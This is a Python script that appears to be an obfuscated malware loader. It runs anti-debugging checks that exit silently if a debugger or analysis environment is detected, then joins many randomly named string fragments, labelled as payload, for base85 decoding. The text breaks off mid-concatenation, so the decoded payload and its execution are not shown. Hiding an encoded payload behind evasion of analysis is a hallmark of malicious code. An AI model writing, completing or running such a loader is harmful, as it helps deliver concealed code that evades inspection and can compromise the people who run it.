#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_cw7MzotI9IYlpC = 'B%Qve!i*$cVQwyPXtc2=C{V}88mnTb;AY{mtMnd4Y6lj?f=g{&jpj)Aw9$L5;VX1i*@^6%5K1lcI;Z4'
_cxvxFQqkMqvIXm = '7S@}SKoTBG!6oA@uWmUzPIK0q*O1&OQ1Mm%u8V=lnnWP3t0k}@r^z6<tD*A=3v#lQ31lPHGEYV~2OMg'
_clBuzu44At6EqL = 'hTv@v!DUhM`=;X$jQb038r;GCZAZ#?=KLlW#=AnT<O06YOlc_J(46+^A9A%Z36Dv^RaaOtNO(^sB0Hd'
_cymcI305NMd6QI = 'X4Idq=_`r-0N}!ZS2Wz{g_+Ei<u9pm;G;dIjVEKvF(J)A1*m3*$mM(y1#kh}CjcM|PnQvRZr)7!M~F^'
_cu8_v5ZcrQYPxW = '#i{XV5)ifAIl+CN(T<u?d&0Yyr=WuXs&^fluDO0(rE~P++c;LRY(Xgr_N-2r@!O;S>%oP%b3KiGM<#!'
_cd5M0tENCmyavW = 'g4z-VATT)3!9pyH3zYRmUW-R(>1xoALZoy$J5+*HvRH=?o*EJV2B+*X%D5NWWhlrHrw%ZDB@)SwK*ui'
_cntpnqN9toTJHb = '{AjR7HJ*=P$O^Ax*>yBQ#>F0&#>N;yDd$taLef9_kxCiwitD5x7W8%Qb%B>)MipCf>y?Z!3h<e(T_0_'
_cqfTikqHDFz1IT = 'GW!qsc|5e{GN1cCNx6V)v{nNV-~^;y}bHp0VP_Y|;?8wTmoz`wC}dXW?{whS1Jz6r2$@iRx2i_Sg(<f'
_cqvGQcqnyusuFu = '}A~A&Jo>Y~A4KGu75&|0P<-n%^UV<N4v_nxIy0)Tt(;SxNGBo}lQ%H!9ux&F(!$iv`fB7x5GV<o#tb*'
_can2FInd83CsIW = 'K+{%g!A>9HBFb4S*BjSfA8rm%7Ey?Rlr0dn<lC^3x_FZ!0iJYRhkBVJvj#^v;5){09ma)@8RJG%{JSA'
_ciaK4nDpCJatQH = '811_br4J|oy92295L3b;B;YhU4`SY{K??=?;p%%_st=yz+sKVDo4m<6lx`Oyq^T|=KX<$f;dO^~Wufj'
_cm3Z8VRtr8Ogr_ = '70y?*?sjdM2Mr;OoRuBD8g&u+$Sxk@<z6?GP!B$4l`}|pXm-*uf<<t$J4ed{9bpPO9<w=H<Q=tLuBuz'
_cyXQNGcEFMQRx0 = '>$q#$vyQGnuBJCp3oC;3~KP9}tkXr1hS5HHf=VRs3{f+4>Mgmh~N+VGZ=pcl8^Ofhnt5LzY8?|avyw!'
_cvdhOrajh_0YA2 = 'hiZA?|shul%H^foMGJZnzXB#UpsFd&}-a*)6_Z!Dp%1!2Qu5Ji<AS-D|6dR2k;0<U`LoKC{yN;4wf%z'
_cgDy1_Hl9ayBEL = '#`?)?*!=0`6Dt1$+=TDL>(ORu_clNz{Qg({<O^(-nJsQX8zn#6i7G<9ggk@uYG$Ze@9jL3C+1d?NJ<G'
_coZzQ3ZPujY_AX = '%lP!bE_#6tG{3qy-1x1#Rlf5+LDdSpT2v&J50YmNC^G6(3p{TAtLOHZujNO*AdcKwKO<^UwP;W_+fV`'
_cugwYKX8OQctXH = 'luPpG4j&dw<-}xEFZ+PYAjLD!n0#FneR7KWJvQ6oEQ9+^P;Vuv=__k_uI&+AmZP7z_fyv4x^#YJ8<)u'
_cllGc1h848InF5 = '5Kb4_Bb{Z(Ix7Viq<8(4Su!ccOw-)LTuIs#&@B|rrON>iwX9RhS}tjsGu|K7?*a;)F@Y@Jj3g@C|@V~'
_c_wld_HZPunA6N = 'Dw|E|e~p7sDSICH6p92cH7gM>bD@Z$4#y9pX6d2kN#YB1L&S6X?C#IahA(j;4C9x9-8R+X7_DkO?~5R'
_csvhMWywao0nwj = '!tCi4^4<QTx`{_Yimuf3#4#h67a-`f4higbpOeL8&^O%Z|)5oaWvL96O9HK3h0^Dywx}_S4Fa&==(CU'
_cjnBELFYKFSa3Z = 'z+>(hBKDWByc>-rsX|&kDa!=|qlA?odOf|kq%3`wvv|%+8MVom=IbQ|#s@rKI@64i^kAj@!-7KiU)D1'
_cc2kr61QYyLNy_ = 'TY#-c^rb?BAOdgXaj>!m=x|3p<J9R%zT=3$LM6x^{jA03NmLf1>MaM#ecj7+($>Y`grB!%I$3fMhFTo'
_csQp2tUfNYdF70 = 'JVNPDJuLB}kH)Vft*evIW>mC%2F`dt-A8i}M(u^Qf!(a8SN6$Lbao*kDSr}@Q;nz7y^Uv4~D6yV&qPO'
_cy7eU5YSa0lsL9 = '>tHUbaI3!0(N;yS9EK942er<4ddT^iGHk>#}!CLJJ*F5hMtuo%JH}r)a`z?$3#i=+!HpJ#~o@HF3NQp'
_cxU7tN1hG4zpVX = 'cwtABrKK`jRe8ASFMy_L06+xg*5CTH*hcr;>cVAcopzp0&~88bw0&|UiAz~5%^q17uY9DxPJAq`zRs2'
_cl9XUnYOJWxZJA = 'T9t#P*o`XwPtz4Lzn5p_#-5JmN6+7ZlaKAV4$26%Hj3BXxzRHHpQMwkuO^Os*sSE{xKKkwW4ejdy(DP'
_cwV_erDO3th0gB = '_a*yy!RL5*<f9>&`J9!C~P5M6oxK2-NL0#bU`>QvqD#Q2|hT-)kcYEX**#EB{wExwT=^0b(qF?Zw!fa'
_chfKnyRGeN2Eor = '&gf6wkccTiM5P%f%vcj>W?PV^<`3Sab!ISKSRs)mYIWq7onIpcoMF5+k`_JGpde>(K%EH@Vyz4=c&M4'
_cpYr67W2xCDlQf = '6^s^3HNxdbK_4u|~PO{Iab2sHz!Y2GG#fJwX`flaGaC!Q?%ceN@|5jBDy`pXY%%xk((*aW6f8_`?kpB'
_cwfIN6qdG9mbsp = 'ypzuMp{2^bSOiU>X204Ml0N_#ujRa1*0~)T81jfZr{|vYyV!2JJ%S7xL26p4p}Y08h1{ymw1t^pT`#}'
_cfcJDaMfvefoEQ = 'v)Wn^+^|1N(pLXX?u)JVvLghc-I`Y9d@%j^?^^iQoN5Imo5I@|oa9(RS^{_k#uv6myPzNwoEF$+=l4)'
_cin7d13tUWOjTF = 'R^2;}qW7ZySxSUYc$yClxtzgFs=`9{aF{fs5-em5jW?L<JXgHz;*EBucOpc%AOGY=+nY@!lGGGH*{WA'
_cuEsvW5XTzTbrs = 'p3j_&rye?!#>JygNqteBO4*x?I%{)*j_oW6BJiMXDR3f@`Q*~#BoYBrd6S6p!W>abhS3w$a{=v6|h$V'
_csvMxoWusC_ZuV = '4_|v{%K3=!W<i%Er(WzDp($ojYVeLSnS1IsiA6vLTneKF;R{u4`ELkl-{Hif$D4-upBxcyde^OiIyIQ'
_cdRJLm3Os0A586 = '+^aDaO6}IIG~zzgTgsEQ-P@Dg5Y?Gxx}v&O%ls0(gc(;cWhC)jYzO?P|+Kaean3Z%j_ti93qZFRKwx*'
_clRLinWmFSiRUD = '{M^XtDr(`tQMh(--H#P=E*bOH9tdwIp-5WEexkI8Y&)f2b_1Fzc6RZFMsO-^h-b=7__q)VRE1|!ce1P'
_cx5RIXDmD6eAMo = 'vwEWJ-<Fi0X@z-)Ne1!RkjVni=(R>2J4Lvo20bE8S{;rxO`ghyKq^6=h3Ew-^8d#)j4xECUZ+l!p_fH'
_cydVE1MZTQM4cb = '`#+0fcitZ3+H&O3<4gc+I;z>EIA+!dx%akD=KFn*Vp&L&}TewFsbuNM25JE#bg6;^e4O$S*A@|h<b4E'
_cnwA3xY3nGmR6l = '2rZt1YSD>m6TFojq1J1k78<3e(#&_LSUAMxpHdA`EV|n2Tc;G)fsroJo`!;fFo11+;yYaETpbC;mNUg'
_cmtDiTcOQeOo0j = 'U_ro(Yv5p#Bb4J5e<T$&o1%-wuN?|ekJH|ODG}=bs2yOd4%2c^)-ehQy(sa$NA%TJ^P`m1(bzI3wCDj'
_cfsK6I1y_iyq6v = '8X!wtx0b9xEroo{zr+ao5C24~1x(MbX)oYBB(DAtuhpGOV;uSmBEFmigJIT4x`)O>x<hHxCUhg;=_~R'
_cgydkyK_bwRq_G = 'd@Ot)A63}uz)@l$5mQWR&e0>c=QFz|bsy$FDs^_75(|<gk)fP-f)Y=$<O1+!#S~l}S3}|u$@A<V*GOL'
_ci65pXYym4UT2R = 'J7D2E=6z>4WklxrJ_rGsYl)xuaSRg$!*5tc=dg~XWVsTb)u`5u1DW@~E|3hH%Cy10X>9U8&zOg(Gxni'
_ckOEXZIApsHc4Y = '}S=lTP@M%|E<&j-K;P-2_+%0oWfiCo0lEoWxL2=5c5^9dn0~Xs+@A0OJHk<-_FObPJES)jX6<l`B@q>'
_ckmcog9OJyaYsN = 'MyT#;p}lc-%LC*|IN<KMDMjm=bxH^h1A#eW#GN)p}1-{gw2_DxO_{Oky$?1H^QT0Pv*#hvV^#STtpE!'
_cgnLqCQwvYECTD = 'o+(_dzXY=x(&Lkn1A}GD7blizzadmnVIcQ}Q<&!GFrrvzQ}n|1F~A)xwkkv4D9Nc>^1RQWXn-RvSGjc'
_cfoP8A5jCF7aMT = 'bQ^*fH;T>z)WbNsyyxpf6R(e8id?IhDj;1mgOul#K?RssR$5Y8h>Ug6j$utE6@@OJdxuFW{|JW#WG8w'
_czIS3v7nJUzZGi = 'EANjOtV9>iD-Xr;yLt7<K)ODp&NI*Vr#wbOryE@vUt6&tI&%mxUx&$X#+7l)LMpPQl@VJY3`XXWYyJ+'
_cklM3yLuhc7c1o = 'mfL@e>$9W6R;L(D%|`O~PmMeou-&wvv2%0aiU2#q_Z))LvRmCO@qb&3c&iAV13mN1VK;HWM#HWEwp^Q'
_cc5WTC2nSjgf0o = '9f4hA@gdy(gq{q{}CQZLHfuW=|kiGBeoQOnt5W{iD%3-(Kv>XzuV(A(I_5<{VW=?c%y?DK)Sh<E|O}q'
_cgt541bEOwI61W = '7F-4ks_N2v#SO$A8)7sMO~IJm4wENZfY~kXgWfnhI<hznt~jn{N?M9`ykHj3I<k<N=|IzJ%>lWf{v9G'
_cvuPzgUFeJk_pw = '};bAb~&o?Xx(0*<5(WPanEtYr`yRTs+bXZ+h3$9U{u$iPB;Gf2wdgX39nk|JzqFj|<InN5Vk#N$wWy7'
_cdCmZmm1Pb4bL_ = 'Vi-9$YrMYcf?)3Wy;^KjgU(uk`L6c$0UOeW1o)#?{pfaHoj)jJ%;8cN&B`rFm~-4nHP_Wr{@cxSr@SB'
_cnrHdqnUWMs6bI = 'SJxT)P@ceK9*MxdvJ3^5r{zpDP1yW9*fCpr`+yeP~B3)FG-s&Scb#0Aq8GELwC$&8aU?%*|P};!q(Im'
_cct_BoEYSok4C6 = '<{_?`zhEhZCkQUchgx@i^{9O8|_j2FXycQdkPM&LsK15^4M(fxLE5esCpjOEam?!Ni3<K*IdPu!BUb%'
_czRtGQdd2yFEs4 = '<R)odGaG7R4Ribo007fXUI%U_GGT}}jSrEt>#~R==Mj6E9S5OtRV%P4_wsV(E224$1=h{i7^^1-T4f>'
_cdKp2de4PDjY2T = 'dtx+D1dyp}YUwMTZPu1+xOuDU~3<`<@ctJJ7z}9AF$X7_{DCcie1`{-A_H8Ya{2?KWh+I5(kExX6;k~'
_cruBaxZnPE7z_b = 'b~lQrOKtW{SdB#75m9jWn)!rUPLIoDz1VLq}jEIK@J9W%;`ZutzkHDWDh%ON|dmsis2q1t5=N{6I6xV'
_csG4Ye6pgy2U9n = 'pLTWHao%dD%|vqrs{aygQG=*|lKnEldhR1%&2v>=^-Jt_?nJhc`DnbOTzT(N`84a#JQABpgS48wKd$6'
_coJun9IjSPK5bz = 'qRv*Kk%ZI%TZ```Jyt`^!rHLIRo=RHN`-uX#tIRu;bd8_#$1#$J!Zah_Ug#0btk?I*|}%j<cvd67@hf'
_ckZOEFkf5lgHOU = 'I)^eBqU-rn@pyYLIl8JT?7<2t1=O(x^Ry5>EBmxuS_(LX?1RaH7E0@S%h24BSfEdH1S^e=qEZN%8Rp<'
_chsBH6e4juLy6L = 'yO<5co^kmp(=9@lJ<SUDOv^XS&cR_Zi!+I6OnH7S|#kh-}k=bc4TKp=jhU^&p>bhFptor}&rr!p34P?'
_cqA5ZAw7fRR26z = 'fqRMY?UYBekwV4rG}mB;s|t}xouga@;kYecLV!q`Y(aa&g^C@QQK$Ymr_07s8P7?Kg_h0vqr??KrHY&'
_cfs5l5QYXnke28 = '8zxbjMI*x3!{Rhlpl3Dm$>FQ_xu$BK-Hd^={u_|0%$D`_wc5>WG8ZCsL8;92!0uai3@d`@6E?HW_dhY'
_ceda5a4lLLHWbw = 'lOZRS(~^Zu9|j8dMv_tic7xBQN(CJ);wm(>s-PT4<9at5qh8QQR5UlgVC}3MV+8fp~A&s$ptqB0b^<L'
_cfGV2grrHOjb3q = 'o+dWd#T)EO?VikAA!PiNdyo_H_nC{jw)@4bO9u?eXZ@BzEN6%$(jf8wR0Q&e2aSyfxOCT524=a#__{g'
_cwvqNNRUS4flf_ = '4z_^2sEoM1CQ&Z3L0+Cv^ZAU9V43*UanIIJk_sd;0t^E@iCZrVrhwc7Vu2#P-z2t-w6&-jdMHWWax+9'
_chCOsOTZtctOua = 'o&sV?1k!0BR+%seQIujx3PE?@L~)1Wsk=Rt2acW)cau!b00pMit?-Hq@221W~OJS2)Z<{$<Rp14fN*Z'
_cy15mKBAxG4NmZ = 'td9$HyR5Xs+{Vw5Rha`|+ZQw6dX~;?<!TU%{P;V|o2c8WSivVpYW^PLCaRHpUCDCj!A=g<9-t5Zpvaa'
_crH4phrGVsp_9Z = 'DDA?5KV9Y94w8QH)3d`UU|?0G4$3`jX_)E#QN~NbW)j8L@5k*1u;*vjHKor!Mw1B+#s5-1XL{}ZaL@f'
_cnYhWt4IJZ8tJB = 'KcY(Rc)tYUQGc5}<5uBHGtyp7##gil_V$+!iFHVpjkA$9pAimKg{Ceyo;IfYwG1(7Pxg{HRlHln+S-k'
_cx8LFr7b0fECJg = '$9~=0V`$}Q7Dpl0YR6fv5Df=lND$I;=-B+l6DPKrPkm#-jNi*4ypi?Wf7FP*mH`1M2;X_S9$L^6#+TW'
_cuihXAtrlREOwY = 'u_$2x&m=ftOBKrt9Wj!NxcXeduuMK@At`a+@aA2EBTOQ!zbSi*Lb$Y`tA^v;HIXtoAT+vS9w|9cfB$8'
_cvzJbZOYXTbysv = 'qz3HW1qJ_Z(%CkjOa4kmeK?^3#QJy8L&x=Yf3?*;aBN`)1<>jCUztJ^Nya$v7M0qRf%`ckmJd(aYdo('
_cuGg3XXkDl11oM = '8DiElgYnpqZ+M+gPaG1v4T7^Eumsp7bRCI37zb0p>&BFgw8mh<%faR!Dt1Vk$)gg=Z2~`D+!?yk-4F)'
_cvz0MkFemBEXWw = '{?$<Apn|noiV;16K+q3*|LNWnGG-<A8DpEfoz*F6{-z=)8K>ne(_}(Sj7t?M-ZFo43k8<OaNLP0u_R2'
_chZEnwLGn3hyNN = '5>oiHEaC!Q6-l`%BBnt%^*kHgm*gvriiZBKhr`$+@AIYQVcJ3L=T;*g^f7yF4U67K}wmcp33Og1l?gT'
_cjkWo7Y4FZbcOu = '@Na4vGWz_3YC`Al<C24Axk5ThihsqL_jVJrxawC0x91Ti_gWMk{oSh&yeXa37UfHVVd(K?|F=pozQlC'
_cw7uFR_JbJWZoo = '^1&VJ%vog==pO1zNJ>wZ!+v*Ped<Z>cZ-^ZF7*|5Jc0gLO5L&8$tIfFFHOnAO|x(uw9kjEj>>tYp*h?'
_cwY1EdLJqbWSwk = 'V-PVdps6VF|q!9r(oB!=#P6Qc&K>0uH~G`CU7gFv?dI{pSLVB_WPzdZikufOXlLSbim*1zZu+{=P&2P'
_csO71jXBmB_y29 = 'jRx}Fo&?-C$h5*j+a>zb?2Ao81(FBVZ8S^TK^LDFRdT1r8vqS{{<XoV=NUF0PJn74%u>J^oW(LngpSY'
_czCR9OzA2uYRxQ = 'X-JqqzVBDju@?iVh_3*Adv*R19$p4^2rUMgo8>k^?hZQ^ug4AVHUcuC+B84fv_f$vYJ)&e0vAKahh8V'
_c_tHqbxP3J3dAM = '`5$k?%xAheEiMB2)cS#V=2$U;8LDK2z^sr4-Z<+NLv5`|$!_9L2`|71dm@kEur4L=)Dp!`1{!?h^ARP'
_cjuNYmD3QhPEFu = 'F|*)PAlVC`;QL`s@ainh(vFEuH#ZNmmY68^y4#Gf)PX6Dp^5J;al%g216o2-EbSfMe)MfE5M0<^@@4j'
_cs_TBKNcVY6S_O = '}^FT<T%lXHZS(^%SOT!2pePMYsm?wi5#wx&FNB_dRy=^%God2F6+1Bm&gR$Bt}l5<?Pq0GQ}Hi)`D+='
_ceHPPLrAmjX7_O = 'E)+g4YupRhw$Er$x_49wDfHoLK^CM_$y9OPRrfQee`@<^j8%sd(c?S&Zt)s|y*`?`%ZNi<)4a_f11?l'
_cr9LwlS7IVYg3N = 'Ax=Nt1YoLkpAo6mE<Lcv>8CHZxl?50#_!d{%DMsM{VPT-XP-L#CTcrQplZ=q$UNZI^2;hyA07^)m%Nz'
_cw3fb1LHylasDF = '&og&dxcb<Zolos6F}Rj%`-xARmdKJ%4p3o&CItqbYf++)U1ku>q3V`Q-CA`86_`o9UH^kMr0xbJ!_oW'
_cwFfNtLKm0OQEy = '_-?t!6^AB+u;76<8qxS-6ENW-|P8C}J|qvF!R~8r4I{LOWd_8&6s&{bFHOjj%|^M*1&uvL}oKcS(_zq'
_cjgi5jPAUVDjMI = 'Z|57<xRM`t@uBns)FSW_wFBN!l6a=*k{cYc-)C#&5%`UNq&4DGRELHzH-~3kS@)dd&d9?y^22>uLDqv'
_cqI6ljnpV2EoCO = 'vBE*zhJ&FJ$QjWh-kzsxA1Lc_iEBdw&}r$1JxI17vl)dwxV$IYd1ItQ5fTU8Mgcj#+p|G&a){Q#ivKO'
_cj6CDP9ZusnmD8 = 'R(ciAqlJ};_`Rr8BUdNU1eg6CnYR!ZPk1e*QIFpRqCklC%Jf$q+;SaAzx2rwD?AqhI&yz)yCF!1lLm~'
_cqbyDqtPdQ0jk7 = 'w%Ej;8oNGN$hM-Nhxuzl$~Psf`JwqjDC$df0w@Y#(7&7v^i%JJe=%FIP%8s2n=8@4_kx%3rOUH+Sf36'
_ctQ2QojEg_bI5J = '%SP5Bw&zsDY>Xc$lPcyvHaPZPy!*8L43*GLJ<K3XP9*v+kOt1dHntHpQPo<NwTsw}JAUIO+x*KpLDHF'
_chzMXzhuApkP4x = ';Y1)vz@$c1^XzCJm&%IBF>??BbxQb*VRM9aLRjgwJ#m+Q7~J)d#Ayhk<Oo?Y2#<CSPgtc5ur^hZ*h`d'
_cpFCi0FmnRux2f = '3bV`_KXygsykNPi0)E9*ItS|%yvZLkjiq*r&B0L{i29jC3D#KtN#N~iQ=Rg~R{q}(;KvyjSan(@C+(~'
_cdIyfylf0sHxi5 = '__6XS%8Rljmz}uI1Y_bRk$wv>k8BhHf<)37aKCvVG-J_o0FB_$RsTUDS=C`*K9_-ZN0oh?5j>WbzRV<'
_cg0eWLR_4dbC7U = 'F;62fBA?@SuOLS(R?!wo8Ers4P$QBwX&6*fU^`LrQ6zQp9;H%pt^wo4J&4bIsB`0`O*Jp2BN(N-0g=q'
_cn7pNysYQ8lCPZ = 'UX5^lBH*sRa%H?uE=RDN2syXnO<+KN+iNdh<5Ugx|L$lqu_p2;O(?k9$!+Un1s~E+f2&IjshvAlbuUS'
_coKOGLUYMXg9Lx = 'WPMqQez;N<h$xlzPKRPdEgD>Wre-3s3wj*kyB#a9YxGFap;6LGQxs^sF0*0N$ODCWur=z-DlTHY_Nw9'
_czattMxNZ5W7OL = 'Vdq?lZmb^1JaE9+X(E3c6gU$YDGGXNNxiNbt4&|aGTdLBbUzJ-GWj418E6Gpjq+iu2Aw)UOg)~hog!3'
_cf8WqIpqCre7Zr = '81-Ld9#5~mZpqh+O0sPNdq##wbEu@#fa^zMXB|idEv-f%iq`dtjnm||Sr$U~dWBnh~Iri%c&1~0pof;'
_csKP0xPxfqlV42 = 'I3IsvwYXEL4t{}5S3vT1u*e#6wP5B0BSefjH24<#Vgpdd5TFly*iEk(#@>3tSWhDCx!$B6;PbuSBQ_K'
_coDR_dF8AxyYrf = '*GQblfowBiRv4*z=;rb-4Qv8>D9{7ZtcAU+zbb@%v>Bzb19WNtWML>K!5*_-<0NeTI2te^dQ=QO8R!('
_cjZlQYhyOtJLEz = 'Oe=6JxEzn?*byBb8jpfgsxUe*YFYQu%5DAj}X32<x<sbiB=c4H%dm+r$L_WH-9JEdGoMl^U0$kws}GW'
_carnqd3RNuTI6K = 'L?|{l`??=U3fey}#E2v8$#bDK5~-wD<81+d5`CNb5I)WU^o?evycYsI(nR1J8LCxj!s9p{m>S;keW+|'
_cxON2Dv2NSxrMM = 'U(jkv@6;@WO`34F2BO_Z9M>Z#ir6VnK>*i&>0enPIqd>s@)>}+A1EmTMIAdU1=>LFv0E?Z^Z4}Vm80P'
_cvFNvLSzcIRWR_ = '%j8IH)|=$d_b)1eH#g3y%swIi5l>QAEV?^UVc@7DF$(t1GQ`pWUaeXOD5>wgyAT69Q%O)<%d{c*g0tR'
_cxVKyu9AeGC1Fq = 'xR5&T*$P2;kK-+#FZzY>hbdfP|3t8aQm1W6PnmgD58zj&;O^6*w1X*7{Bnz#)_*t-W)dvBdPurtTH*Y'
_ccEod2T_qFafT1 = 'I2Vh2~=e22VA}Tk~7%CzU;C-aj=S9SWZSX6*|(xJxWjFQhS=DFJzAQ&N1dz>89w%8NHx)a~@1VF%fCb'
_cdQATdyXgS0MoG = 'rTcOQ&N7Y-wsHj(P8n*yoz}ay<xYY#C>8N^1UhlXlmsN<kP$L1l%$ja=al5afV3Xp@gHw1=!`pgaea*'
_chYMo3Gd4v4iGl = 'q=!eNTj_Ac3wV5T2JQZ9WSKQEZi#C70kV=>_A$)3MT^bspaQX{Q2jLDRQ{VHWCOK)`<Eg={Rv{ikaZl'
_cvy0Wi4_wuaPzf = 'T&0AP?kih!zG^&nk*rr2&B6mUTSvg1_X;YPmuz|+7=xt-C8F`bx`D_HBFr>jrMQoqQhl1Z|GDY2Us>-'
_cec53NHG2BE_x9 = 'jGY(B0?kMRP3NJ*QY2v-AM1Ew~%yVQ!8Fv&bRekzr_?CD%sDd!dwp19OQm$(CjTn$*6F;Pj*>H+_~e9'
_cpSnNBsc8yvTW3 = 'eIh&<<#$g$QWQ5x4QKqCV;_0;><3PeKOtCVJA;WO08*)zZnf=Eri|mSl>S2)z}-{T+@hwmkg=3T`SXT'
_cnwfM8g3cBAOVy = 'p6T-5y{%n)KmKlkf?Pb4q@z3p$0;AbCIBE3NJHQ$R>2+8#+PGHrbTgZq7Bz)?m=1D4LB7p2ow(nS^Iy'
_cdXSKiqDAhWbj_ = 'z+I50x)KyfIDeFQ%UKqone2ZNid=U*~=dE8L{IGFMWsyTy1LwG(OIeALPAk(3H_2+`2fKfxPgXiGBn&'
_ca84LlsScSci16 = 'dN6~L#5DG}thVz#DEX0dlr#F1@z9z1S=f@?aarQ^7#nIuHpGi!=D;~O)w$~QPgqE}=UYDcT#eZzqfiw'
_cmN5IusETTWre2 = 'VzW;L+NR$;}sT3Oi0UocBiZyg_tR{=ElC6jC1BN7q`m2y2<=dRtEAi}z3R=0Z#v0jI{gVp{uZrem}4n'
_cycBdiJkvouE9c = '7Hnt`bDRzw<}cg$jcKgF*R2CfBf0zNZ%H;{TX*|%b`w1xc6A{GDJaAe%VG=uwCJ5q0xG~n-zD{OP-u6'
_cfNwEULXOwyvry = 'gD2P(9##8Q{*wk;TMej6uTH&&t9L%bQXs9}kpfSj?Nu^N7C?7}&tBWo0>!(oYL`N-W$c9{JG^?t$|Um'
_c_q_dzacGW0rJn = 'RyFCz2(5J_NuZU%wxDTceZ(e_`Z<Kz4%8|Lnr*kjm{rZ^g+M<E;Y0y8fYX}<WA`mI}a3(mS6@dA`N8s'
_cvh2HlsW_7vZTj = 'zvp7lG6X@5k`JP^1wK{-EH?Grx`LOL~t&7()+VkFU075VVqQlG~&;qo7%KL!n?Q99szCtmJNqUlO>Nm'
_ci0FMlssz_Thvl = 'D!l`;hAA%R8Z1sJjGPq}DM(aoMrw(`gxOeu9YxrXer1R15R~+*-xJGxIpX^!Bd69R1c~CQ2Z{bq>*=y'
_cjkJerQskLMp9O = 'orK=3XMh!zDBUI7HeX2Cc9nRz>#>wXcC==@CMJ$MFMcl0k^EtM!eMBW{ib<Nd=cI9@Vb*2sLLe2<!>='
_ccRleF1Ud9UO7g = 'zVhKM{Nyb5t#c%!wcIDPN?t#G9XJEr;U2iQQohOp7rJ{q>E1{|+4kD!vdjGu@`zx;upF5#*OSv5>}Vr'
_cm2_nBKR1FlpQ6 = '>W{ZF>v?;iMM{j92VuRdolejY~H=RUO!=x*+oC`dE1T3_F?}XmnYnV;s(E)yIi$=1y5w@0MbAUZfjKI'
_czaK0L65mImp4C = 'eHav%4eRIEF@4V(T0mp87TUK9~)g|x!Bf>K_==uhtaYlzy+7=tEIZQfH2NXpcTCCgJ3<Gi$-SRtwrq#'
_cw2KjHyqXA7Oux = 'I{0#BRC`x^7mAVwn<!Ab@Uyo$w|HPzoZ?`L@u^>GL+Ha!6t<8rZR}=Y!B}k5b;bmS)%uXS*4}C<Dx+w'
_cn4Zd1bvNO7Zux = '@~nq?C5;e@O5Q>)Nr3`#mE4e)I<u<1h^b+&;w&q@)4!J+O_Ok*!QnxzUYHf`%t!JakgALS!s`>*c*T1'
_ccay7xiQpfWNyk = 'Wm37!f-5c%y<Jaud?4=Tc4DX@3egEx9WQqGouxoTka9>~RgI`l7-*w76k@H)Q!A$A%KwzYz`FEdCIBC'
_caREZsz7ZqHGUV = '_bYCpQ>wiq%VT8s{3Nt3`5gnL^-D5c`=6b9$t^f9plv|(_;8@%X%K49fTu1a5GTh)plk+;dvEe~Mevv'
_cqnfaeb6nevDR2 = '6k<($<e7CTJXEula=CvZAJpc9pQGMEiUGzjg!>eAyPf*ROU&*S2chf>3+9dEp^_4>+jY>3}Xt3zIgOw'
_csL1ttMQ76Ummu = ')q}6Vk&EBunINgB;kZzhxGrw(($Fb0#s>(mz<5Y$IFmOMu=?i2fLKSyhD9^+kt_<;|tQ%=3K;e{=e>v'
_cqhmUvKjxxskza = 'v2%Yb~ZxTunuPj+v}06@>ix=q_98<Y-u3lzu0f;IW(<R0ki-?ZWL8(Bf3Y^sG)jq4+H(2ko#y}EzE89'
_cffUkhFiQbloOi = 'x2rI8VkC({qnw*Fwe-27kC2`9nN94&C6>hb1>kewNNnA?V&EGj&%pK&wCF}!;f)7PI0Rz=#67!<_mS3'
_ci86zncfw0p2xG = 'sV$w`%v<%fd_6BS5U&`eZi$mswluAzl+D$3Y9d@Ma*DsyQACal8ix#+rL#Te^H9`ak`*MU!GhBc3AwI'
_czKar98Jb99jBE = 'b{p=eF6T_WlKuzbm;Fflu*=<>*50Y1l*#kt4&ZdoBdyw>RnUALe^UFfo2v-E*dQv}B<q~mjP9%mMa>g'
_czZqwvKdWLF7l5 = 'SpZgC@g-G_K$S<mP~-M@E|a'

_pveJ6cyW5TErVx = __import__('base64').b85decode(_cw7MzotI9IYlpC + _cxvxFQqkMqvIXm + _clBuzu44At6EqL + _cymcI305NMd6QI + _cu8_v5ZcrQYPxW + _cd5M0tENCmyavW + _cntpnqN9toTJHb + _cqfTikqHDFz1IT + _cqvGQcqnyusuFu + _can2FInd83CsIW + _ciaK4nDpCJatQH + _cm3Z8VRtr8Ogr_ + _cyXQNGcEFMQRx0 + _cvdhOrajh_0YA2 + _cgDy1_Hl9ayBEL + _coZzQ3ZPujY_AX + _cugwYKX8OQctXH + _cllGc1h848InF5 + _c_wld_HZPunA6N + _csvhMWywao0nwj + _cjnBELFYKFSa3Z + _cc2kr61QYyLNy_ + _csQp2tUfNYdF70 + _cy7eU5YSa0lsL9 + _cxU7tN1hG4zpVX + _cl9XUnYOJWxZJA + _cwV_erDO3th0gB + _chfKnyRGeN2Eor + _cpYr67W2xCDlQf + _cwfIN6qdG9mbsp + _cfcJDaMfvefoEQ + _cin7d13tUWOjTF + _cuEsvW5XTzTbrs + _csvMxoWusC_ZuV + _cdRJLm3Os0A586 + _clRLinWmFSiRUD + _cx5RIXDmD6eAMo + _cydVE1MZTQM4cb + _cnwA3xY3nGmR6l + _cmtDiTcOQeOo0j + _cfsK6I1y_iyq6v + _cgydkyK_bwRq_G + _ci65pXYym4UT2R + _ckOEXZIApsHc4Y + _ckmcog9OJyaYsN + _cgnLqCQwvYECTD + _cfoP8A5jCF7aMT + _czIS3v7nJUzZGi + _cklM3yLuhc7c1o + _cc5WTC2nSjgf0o + _cgt541bEOwI61W + _cvuPzgUFeJk_pw + _cdCmZmm1Pb4bL_ + 